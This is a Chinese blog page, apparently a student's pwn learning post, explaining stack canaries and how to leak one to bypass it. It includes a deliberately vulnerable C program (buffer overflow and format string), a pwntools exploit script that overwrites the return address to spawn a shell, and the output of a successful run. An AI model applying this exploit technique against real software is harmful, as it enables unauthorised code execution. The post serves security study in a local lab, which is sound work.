@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="p4IkzO1jTITYkH5zlZW5A3-JHuC0DVJvFSM-3cYRn-k" />
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn学习," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="canary绕过初探在之前的学习中 知道了遇到NX 保护时候要使用rop来绕过  那么遇见canary呢？所以就参照wiki学习了一波canary的原理​    canary  又称’金丝雀’">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn学习之canary绕过初探(上篇)">
+<meta property="og:url" content="https://huangpiao.tech/2020/01/31/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bcanary%E7%BB%95%E8%BF%87%E5%88%9D%E6%8E%A2/index.html">
+<meta property="og:site_name" content="x1a0g&#39;Blog">
+<meta property="og:description" content="canary绕过初探在之前的学习中 知道了遇到NX 保护时候要使用rop来绕过  那么遇见canary呢？所以就参照wiki学习了一波canary的原理​    canary  又称’金丝雀’">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-01-31T06:22:34.000Z">
+<meta property="article:modified_time" content="2020-01-31T10:31:31.594Z">
+<meta property="article:author" content="x1a0g">
+<meta property="article:tag" content="pwn学习">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://huangpiao.tech/2020/01/31/pwn学习之canary绕过初探/"/>
+
+
+
+
+
+  <title>pwn学习之canary绕过初探(上篇) | x1a0g'Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">x1a0g'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://huangpiao.tech/2020/01/31/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bcanary%E7%BB%95%E8%BF%87%E5%88%9D%E6%8E%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="x1a0g">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="x1a0g'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwn学习之canary绕过初探(上篇)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-31T14:22:34+08:00">
+                2020-01-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="canary绕过初探"><a href="#canary绕过初探" class="headerlink" title="canary绕过初探"></a>canary绕过初探</h4><h5 id="在之前的学习中-知道了遇到NX-保护时候要使用rop来绕过-那么遇见canary呢？所以就参照wiki学习了一波"><a href="#在之前的学习中-知道了遇到NX-保护时候要使用rop来绕过-那么遇见canary呢？所以就参照wiki学习了一波" class="headerlink" title="在之前的学习中 知道了遇到NX 保护时候要使用rop来绕过  那么遇见canary呢？所以就参照wiki学习了一波"></a>在之前的学习中 知道了遇到NX 保护时候要使用rop来绕过  那么遇见canary呢？所以就参照wiki学习了一波</h5><h6 id="canary的原理"><a href="#canary的原理" class="headerlink" title="canary的原理"></a>canary的原理</h6><p>​    canary  又称’金丝雀’   </p>
+<a id="more"></a>
+
+<p>​    其实canary就和鬼吹灯里的那根蜡烛作用差不多 蜡烛灭了说明没办法继续盗墓了  而canary也是这么个意思  当程序启用Canary编译后，在函数序言部分会取fs寄存器0x28处的值，存放在栈中%ebp-0x8的位置。 这个操作即为向栈中插入Canary值，代码如下： </p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0x28</span>]</span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">8</span>], <span class="built_in">rax</span></span><br></pre></td></tr></table></figure>
+
+<p>完事当我们程序ret之前 会去取出canary的值并与fs:0x28的值进行异或。如果xor的结果为0，说明canary未被修改，函数会正常返回，否则就是溢出了</p>
+<p>这是对栈有了一种很好的保护 让我们无法通过正常的栈溢出手法去覆盖返回地址  </p>
+<p>假如canary 的值被非法篡改掉 的话，此时程序流程会走到stack_chk_fail。stack_chk_fail也是位于glibc中的函数，默认情况下经过ELF的延迟绑定（之后会有以下延伸出来的攻击方式 之后讨论）</p>
+<h6 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h6><p>基本上来分的话有这么4种</p>
+<ul>
+<li>泄露栈中的Canary</li>
+<li>one-by-one爆破Canary</li>
+<li>劫持__stack_chk_fail函数</li>
+<li>覆盖TLS中储存的Canary值</li>
+</ul>
+<p>今天主要研究第一种方法 也算是一个开篇吧 </p>
+<h6 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h6><p>canary设计是以“x00”结尾，本意就是为了保证canary可以截断字符串。</p>
+<h6 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h6><p>以一个64位程序来研究  代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ooo[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, ooo, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">printf</span>(ooo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello radish!"</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fstack-protector-<span class="keyword">all</span> pwn4fun.c -o pwn4fun</span><br></pre></td></tr></table></figure>
+
+<h6 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h6><p>​    checksec 走下流程  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwn4fun  </span><br><span class="line">[*] <span class="string">'/home/nmtech/Desktop/pwnstudy/canaryBypass/pwn4fun'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>扔进ida分析</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+78h] [rbp-8h] //canary</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);  <span class="comment">//溢出点</span></span><br><span class="line">    <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>完事  我们的偏移就是  0x70-0x8个a  然后把canary的\x00随便覆盖一个东西就能把他的前7位输出出来</p>
+<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">io = process(<span class="string">'./pwn4fun'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x70</span><span class="number">-0x8</span></span><br><span class="line">io.recvuntil(<span class="string">'h!\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*offset+<span class="string">'b'</span>   </span><br><span class="line">io.send(payload)  <span class="comment">#如果这使用sendline发送的话就不需要+b的应为它会自动给我们补一个\n</span></span><br><span class="line">io.recvuntil(<span class="string">'a'</span>*offset+<span class="string">'b'</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'canary========&gt;'</span>+str(hex(canary))</span><br><span class="line">payload2 = <span class="string">'a'</span>*offset+p64(canary)+<span class="string">'a'</span>*<span class="number">8</span>+p64(<span class="number">0x0400766</span>) </span><br><span class="line"><span class="comment"># payload2= buf + canary + canary到返回地址的大小 + 返回地址</span></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h6 id="成功getshell"><a href="#成功getshell" class="headerlink" title="成功getshell"></a>成功getshell</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmtech @ pwn in ~/Desktop/pwnstudy/canaryBypass [15:41:12] </span></span><br><span class="line">$ python solve.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./pwn4fun'</span>: pid 43017</span><br><span class="line">canary========&gt;0x21870cdf9592c400</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x80@\x0f\xb8�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$ ls</span><br><span class="line">core  Makefile    pwn4fun  pwn4fun.c  solve.py</span><br><span class="line">$ </span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Stopped process <span class="string">'./pwn4fun'</span> (pid 43017)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn%E5%AD%A6%E4%B9%A0/" rel="tag"># pwn学习</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/31/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bret2-libc-csu-init/" rel="next" title="pwn学习之ret2__libc_csu_init">
+                <i class="fa fa-chevron-left"></i> pwn学习之ret2__libc_csu_init
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/31/ichunqiu-easypwn-canary%E6%B3%84%E9%9C%B2%E7%BB%93%E5%90%88ret2libc%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%83%E4%B9%A0/" rel="prev" title="i春秋 easypwn(canary泄露结合ret2libc的一次练习)">
+                i春秋 easypwn(canary泄露结合ret2libc的一次练习) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">x1a0g</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/x1a0g" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:wx975lm@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#canary绕过初探"><span class="nav-number">1.</span> <span class="nav-text">canary绕过初探</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#在之前的学习中-知道了遇到NX-保护时候要使用rop来绕过-那么遇见canary呢？所以就参照wiki学习了一波"><span class="nav-number">1.1.</span> <span class="nav-text">在之前的学习中 知道了遇到NX 保护时候要使用rop来绕过  那么遇见canary呢？所以就参照wiki学习了一波</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#canary的原理"><span class="nav-number">1.1.1.</span> <span class="nav-text">canary的原理</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#绕过方式"><span class="nav-number">1.1.2.</span> <span class="nav-text">绕过方式</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#特点"><span class="nav-number">1.1.3.</span> <span class="nav-text">特点</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例子"><span class="nav-number">1.1.4.</span> <span class="nav-text">例子</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#分析"><span class="nav-number">1.1.5.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#exp"><span class="nav-number">1.1.6.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#成功getshell"><span class="nav-number">1.1.7.</span> <span class="nav-text">成功getshell</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">x1a0g</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
